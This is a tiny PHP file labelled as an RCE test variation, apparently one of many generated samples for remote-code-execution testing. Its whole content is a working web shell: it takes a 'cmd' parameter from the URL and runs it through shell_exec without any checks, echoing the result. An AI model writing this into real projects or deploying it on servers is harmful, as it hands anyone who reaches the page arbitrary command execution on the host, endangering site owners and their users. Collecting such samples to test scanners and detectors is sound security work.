<?php
// RCE test variation #639
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>